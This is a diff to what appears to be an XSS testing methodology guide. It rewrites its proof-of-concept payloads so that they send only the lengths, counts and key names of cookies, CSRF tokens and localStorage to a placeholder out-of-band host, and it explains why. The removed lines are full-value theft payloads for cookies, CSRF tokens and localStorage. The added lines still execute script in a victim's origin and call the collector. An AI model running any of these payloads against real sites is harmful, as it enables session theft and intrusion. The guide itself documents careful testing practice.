@@ -68,16 +68,27 @@ Polyglot for unknown contexts:
 
 Cite the callback or the victim-side action, not `alert(1)` alone.
 
+The callback proves the script ran in the victim's origin with the access
+it claims. The VALUE it could read proves nothing further, and sending it
+turns a proof into data exfiltration. So every shape below reports a
+MEASUREMENT of what it reached - a length, a count, a key name - and never
+the thing itself. The `d.length` line was already written this way; the
+others now match it.
+
 ```javascript
-// cookie reachable (no HttpOnly)
-new Image().src='//<oob>/c?'+document.cookie
-// HttpOnly set: act as the victim instead
+// cookie readable (no HttpOnly) - its size and count, not its contents
+new Image().src='//<oob>/c?len='+document.cookie.length+'&n='+document.cookie.split(';').length
+// HttpOnly set: act as the victim instead, and report only the size
 fetch('/api/user',{credentials:'include'}).then(r=>r.text()).then(d=>fetch('//<oob>/?d='+d.length))
-// CSRF token steal
-fetch('/settings').then(r=>r.text()).then(h=>fetch('//<oob>/?t='+h.match(/csrf[^>]*value="([^"]+)/)[1]))
-// localStorage
-fetch('//<oob>/?ls='+encodeURIComponent(JSON.stringify(localStorage)))
+// CSRF token present and readable - its length, not its value
+fetch('/settings').then(r=>r.text()).then(h=>fetch('//<oob>/?tlen='+((h.match(/csrf[^>]*value="([^"]+)/)||['',''])[1]).length))
+// localStorage - which keys exist, not what is in them
+fetch('//<oob>/?ls='+encodeURIComponent(Object.keys(localStorage).join(',')))
 ```
+
+A non-zero length arriving at the collector from the victim's browser is the
+finding. If a report needs more than that, a human decides, not a longer
+payload.
 
 Under strict CSP (`script-src 'self'`), JS-execution exfil is blocked — report
 the injection as confirmed, note the CSP ceiling honestly, and consider
